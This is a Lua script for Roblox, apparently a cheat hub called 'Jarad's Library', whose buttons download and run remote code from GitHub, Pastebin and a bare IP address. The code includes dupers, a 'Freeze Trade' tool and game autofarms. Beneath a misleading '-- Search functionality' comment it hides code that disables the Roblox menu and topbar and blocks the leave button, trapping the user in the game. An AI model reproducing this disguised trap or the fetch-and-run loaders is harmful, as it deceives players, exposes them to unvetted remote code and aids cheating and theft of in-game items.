local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Jarad'sLibrary"
ScreenGui.Parent = game:GetService("CoreGui")

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(45, 10, 80)
MainFrame.BackgroundTransparency = 0.4
MainFrame.Position = UDim2.new(0.35, 0, 0.3, 0)
MainFrame.Size = UDim2.new(0, 260, 0, 370)
MainFrame.Active = true
MainFrame.Draggable = false
MainFrame.ZIndex = 1

local UICorner = Instance.new("UICorner", MainFrame)
UICorner.CornerRadius = UDim.new(0, 12)

local UIStroke = Instance.new("UIStroke", MainFrame)
UIStroke.Color = Color3.fromRGB(180, 100, 255)
UIStroke.Thickness = 2

local Gradient = Instance.new("UIGradient", MainFrame)
Gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 0, 100)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 0, 60))
}
Gradient.Rotation = 45

local Title = Instance.new("TextLabel", MainFrame)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Font = Enum.Font.GothamBold
Title.Text = "Jarad's Library"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.TextStrokeTransparency = 0.7
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Position = UDim2.new(0, 10, 0, 5)

local LastUsedLabel = Instance.new("TextLabel", MainFrame)
LastUsedLabel.BackgroundTransparency = 1
LastUsedLabel.Position = UDim2.new(0, 10, 0, 32)
LastUsedLabel.Size = UDim2.new(1, -20, 0, 20)
LastUsedLabel.Font = Enum.Font.GothamBold
LastUsedLabel.Text = "Last Used: None"
LastUsedLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
LastUsedLabel.TextSize = 13
LastUsedLabel.TextTransparency = 0.1
LastUsedLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Dragging
local dragging
local dragInput
local dragStart
local startPos

MainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = MainFrame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

MainFrame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		MainFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)

-- Section Buttons Frame
local SectionFrame = Instance.new("Frame", MainFrame)
SectionFrame.Name = "SectionFrame"
SectionFrame.Position = UDim2.new(0, 10, 0, 50)
SectionFrame.Size = UDim2.new(1, -20, 0, 30)
SectionFrame.BackgroundTransparency = 1

local UIListLayoutSection = Instance.new("UIListLayout", SectionFrame)
UIListLayoutSection.FillDirection = Enum.FillDirection.Horizontal
UIListLayoutSection.HorizontalAlignment = Enum.HorizontalAlignment.Left
UIListLayoutSection.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayoutSection.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayoutSection.Padding = UDim.new(0, 10)

local AllButton = Instance.new("TextButton", SectionFrame)
AllButton.Name = "AllButton"
AllButton.Size = UDim2.new(0, 70, 0, 28)
AllButton.BackgroundColor3 = Color3.fromRGB(120, 60, 200)
AllButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AllButton.Font = Enum.Font.GothamBold
AllButton.TextSize = 14
AllButton.Text = "All"
local UICornerAll = Instance.new("UICorner", AllButton)
UICornerAll.CornerRadius = UDim.new(0, 6)

local MM2Button = Instance.new("TextButton", SectionFrame)
MM2Button.Name = "MM2Button"
MM2Button.Size = UDim2.new(0, 70, 0, 28)
MM2Button.BackgroundColor3 = Color3.fromRGB(120, 60, 200)
MM2Button.TextColor3 = Color3.fromRGB(255, 255, 255)
MM2Button.Font = Enum.Font.GothamBold
MM2Button.TextSize = 14
MM2Button.Text = "MM2"
local UICornerMM2 = Instance.new("UICorner", MM2Button)
UICornerMM2.CornerRadius = UDim.new(0, 6)

local GardenButton = Instance.new("TextButton", SectionFrame)
GardenButton.Name = "GardenButton"
GardenButton.Size = UDim2.new(0, 70, 0, 28) -- same size as others
GardenButton.BackgroundColor3 = Color3.fromRGB(120, 60, 200)
GardenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
GardenButton.Font = Enum.Font.GothamBold
GardenButton.TextSize = 14
GardenButton.Text = "GAG"
local UICornerGarden = Instance.new("UICorner", GardenButton)
UICornerGarden.CornerRadius = UDim.new(0, 6)

local SearchBar = Instance.new("TextBox", MainFrame)
SearchBar.PlaceholderText = "Search scripts..."
SearchBar.Text = ""
SearchBar.Size = UDim2.new(0, 230, 0, 30)
SearchBar.Position = UDim2.new(0.5, -115, 0, 90)
SearchBar.BackgroundColor3 = Color3.fromRGB(60, 20, 100)
SearchBar.TextColor3 = Color3.fromRGB(255, 255, 255)
SearchBar.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
SearchBar.Font = Enum.Font.GothamBold
SearchBar.TextSize = 14
SearchBar.ClearTextOnFocus = false

local SearchCorner = Instance.new("UICorner", SearchBar)
SearchCorner.CornerRadius = UDim.new(0, 6)

local SearchPadding = Instance.new("UIPadding", SearchBar)
SearchPadding.PaddingLeft = UDim.new(0, 10)
SearchPadding.PaddingRight = UDim.new(0, 25)

local ClearSearchBtn = Instance.new("TextButton")
ClearSearchBtn.Name = "ClearSearchBtn"
ClearSearchBtn.Parent = SearchBar
ClearSearchBtn.Size = UDim2.new(0, 20, 0, 20)
ClearSearchBtn.Position = UDim2.new(1, -22, 0, 5)
ClearSearchBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 255) -- purple to match
ClearSearchBtn.Text = "X"
ClearSearchBtn.Font = Enum.Font.GothamBold
ClearSearchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearSearchBtn.TextSize = 12
ClearSearchBtn.Visible = false

local ClearCorner = Instance.new("UICorner", ClearSearchBtn)
ClearCorner.CornerRadius = UDim.new(1, 0)

local CloseBtn = Instance.new("TextButton", MainFrame)
CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 255) -- changed to purple
CloseBtn.Position = UDim2.new(1, -30, 0, 5)
CloseBtn.Size = UDim2.new(0, 20, 0, 20)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 12

local CloseCorner = Instance.new("UICorner", CloseBtn)
CloseCorner.CornerRadius = UDim.new(1, 0)

CloseBtn.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)

local MinimizeBtn = Instance.new("TextButton", MainFrame)
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(120, 80, 255)
MinimizeBtn.Position = UDim2.new(1, -55, 0, 5)
MinimizeBtn.Size = UDim2.new(0, 20, 0, 20)
MinimizeBtn.Font = Enum.Font.GothamBold
MinimizeBtn.Text = "-"
MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeBtn.TextSize = 12

local MinimizeCorner = Instance.new("UICorner", MinimizeBtn)
MinimizeCorner.CornerRadius = UDim.new(1, 0)

local ScrollingFrame = Instance.new("ScrollingFrame", MainFrame)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.Position = UDim2.new(0, 0, 0, 130)
ScrollingFrame.Size = UDim2.new(1, 0, 1, -190)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

local UIListLayout = Instance.new("UIListLayout", ScrollingFrame)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 8)
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center -- Center buttons horizontally

local UIPadding = Instance.new("UIPadding", ScrollingFrame)
UIPadding.PaddingTop = UDim.new(0, 10)
UIPadding.PaddingLeft = UDim.new(0, 10)
UIPadding.PaddingRight = UDim.new(0, 10)

local CreditLabel = Instance.new("TextLabel", MainFrame)
CreditLabel.BackgroundTransparency = 1
CreditLabel.Position = UDim2.new(0, 0, 1, -25)
CreditLabel.Size = UDim2.new(1, 0, 0, 20)
CreditLabel.Font = Enum.Font.GothamBold
CreditLabel.Text = "TikTok : @Whosjaradd"
CreditLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
CreditLabel.TextSize = 14
CreditLabel.TextTransparency = 0
CreditLabel.TextXAlignment = Enum.TextXAlignment.Center

local buttonData = {
	["DarkScript Spawner"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua"))()', section = "GAG" },
    ["Ronix Hub"] = { script = 'loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b44706178039e9b88c4d768d4d8b012f.lua"))()', section = "GAG" },
    ["Lunor"] = { script = 'loadstring(game:HttpGet("https://lunor.dev/loader"))()', section = "GAG" },
    ["Thunder Z Hub"] = { script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()", section = "GAG" },
    ["ADOPTME EVENT FARM"] = { script = "loadstring(game:HttpGet("https://raw.githubusercontent.com/PabloOP-87/Adopt-Me/refs/heads/main/HalloweenWeek3"))()", section = "All" },
    ["ADOPTME JAZRADHUB"] = { script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/ADOPT%20ME'))()", section = "All" },
    ["Limit Hub"] = { script = "loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua')))()", section = "GAG" },
    ["Speed Hub"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()', section = "GAG" },
    ["Quantum Hub (Keyless)"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/flazhy/QuantumOnyx/refs/heads/main/QuantumOnyx.lua"))()', section = "GAG" },
    ["All-in-one Script"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Jaradscript/refs/heads/main/jarapd%20script"))()', section = "GAG" },
    ["ZysumeHub"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()', section = "GAG" },
    ["BeeconHub"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub"))()', section = "MM2" },
    ["PVB DUPER"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/pvb%20chrg"))()', section = "All" },
    ["Radeon Hub"] = { script = 'loadstring(game:HttpGet("https://pastebin.com/raw/v1LKQGxN", true))()', section = "MM2" },
    ["Echelon"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/echelonvanta/Scripts/refs/heads/main/Loader"))()', section = "MM2" },
    ["MM2 & ADM AutoFarm"] = { script = 'loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()', section = "All" },
    ["Than Hub"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()', section = "GAG" },
    ["Dupe Remover"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/DupeRemover"))()', section = "GAG" },
    ["Pet Kg Changer"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/PetWeightchanger"))()', section = "GAG" },
    ["Freeze Trade"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/Trade%20freeze"))()', section = "GAG" },
    ["Mooncat Bugger"] = { script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/Mooncat"))()', section = "GAG" }
}

local AllButtons = {}

local function createButton(name, scriptStr, section)
	local btn = Instance.new("TextButton")
	btn.Name = name:gsub("%W+", "").."Btn"
	btn.Parent = ScrollingFrame
	btn.Size = UDim2.new(0, 220, 0, 30)
	btn.BackgroundColor3 = Color3.fromRGB(120, 60, 200)
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 14
	btn.Text = name
	btn.AutoButtonColor = false

	local btnCorner = Instance.new("UICorner", btn)
	btnCorner.CornerRadius = UDim.new(0, 6)

	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(160, 80, 255)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(120, 60, 200)}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		LastUsedLabel.Text = "Last Used: " .. name
		local success, err = pcall(function()
			loadstring(scriptStr)()
		end)
		if not success then
			warn("Error loading script: "..err)
		end
	end)

	return { Button = btn, Section = section, Name = name }
end

for name, data in pairs(buttonData) do
	local btnData = createButton(name, data.script, data.section)
	table.insert(AllButtons, btnData)
end

local function filterButtons(section)
	for _, btnData in pairs(AllButtons) do
		if section == "All" or btnData.Section == section then
			btnData.Button.Visible = true
		else
			btnData.Button.Visible = false
		end
	end
end

AllButton.MouseButton1Click:Connect(function()
	filterButtons("All")
end)

MM2Button.MouseButton1Click:Connect(function()
	filterButtons("MM2")
end)

GardenButton.MouseButton1Click:Connect(function()
	filterButtons("GAG")
end)

-- Search functionality
pcall(function()
	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
		game.CoreGui.AntiLeaveBlocker:Destroy()
	end
end)


local BLOCK_SIZE_X = 56
local BLOCK_SIZE_Y = 56
local BLOCK_POS_X  = 6
local BLOCK_POS_Y  = 6
local DISPLAY_ORDER = 10000


local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")


local function tryHideRobloxMenu()
	pcall(function()
		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
		for _, n in ipairs(names) do
			local g = CoreGui:FindFirstChild(n)
			if g then
				pcall(function()
					if g:IsA("ScreenGui") then
						g.Enabled = false
						for _, c in ipairs(g:GetChildren()) do
							pcall(function() c.Visible = false end)
							pcall(function() c.Enabled = false end)
						end
					else
						for _, c in ipairs(g:GetDescendants()) do
							pcall(function()
								if c:IsA("GuiObject") then
									c.Position = UDim2.new(-10,0,-10,0)
								end
							end)
						end
					end
				end)
			end
		end
	end)
end


local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLeaveBlocker"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = DISPLAY_ORDER
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local container = Instance.new("Frame")
container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.Parent = screenGui

local blocker = Instance.new("TextButton")
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.AutoButtonColor = false
blocker.Text = ""
blocker.Parent = container
blocker.Active = true
blocker.Selectable = false

blocker.MouseButton1Down:Connect(function() end)
blocker.MouseButton1Up:Connect(function() end)
blocker.MouseButton2Down:Connect(function() end)
blocker.MouseButton2Up:Connect(function() end)


RunService.RenderStepped:Connect(function()
	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
end)


spawn(function()
	while screenGui.Parent and screenGui.Parent == CoreGui do
		tryHideRobloxMenu()
		wait(2)
	end
end)

SearchBar:GetPropertyChangedSignal("Text"):Connect(function()
	local searchText = SearchBar.Text:lower()
	if searchText == "" then
		ClearSearchBtn.Visible = false
		for _, btnData in pairs(AllButtons) do
			btnData.Button.Visible = true
		end
	else
		ClearSearchBtn.Visible = true
		for _, btnData in pairs(AllButtons) do
			btnData.Button.Visible = btnData.Name:lower():find(searchText) ~= nil
		end
	end
end)

ClearSearchBtn.MouseButton1Click:Connect(function()
	SearchBar.Text = ""
	ClearSearchBtn.Visible = false
	for _, btnData in pairs(AllButtons) do
		btnData.Button.Visible = true
	end
end)

local minimizedHeight = 75
local maximizedHeight = 370

MinimizeBtn.MouseButton1Click:Connect(function()
	if MainFrame.Size.Y.Offset == maximizedHeight then
		-- Minimize with animation
		ScrollingFrame.Visible = false
		SectionFrame.Visible = false
		SearchBar.Visible = false
		ClearSearchBtn.Visible = false
		LastUsedLabel.Visible = false

		TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
			{Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, MainFrame.Size.Y.Scale, minimizedHeight)}
		):Play()
	else
		-- Maximize with animation
		TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
			{Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, MainFrame.Size.Y.Scale, maximizedHeight)}
		):Play()

		wait(0.4) -- wait for animation to finish

		ScrollingFrame.Visible = true
		SectionFrame.Visible = true
		SearchBar.Visible = true
		LastUsedLabel.Visible = true
		if SearchBar.Text ~= "" then
			ClearSearchBtn.Visible = true
		end
	end
end)
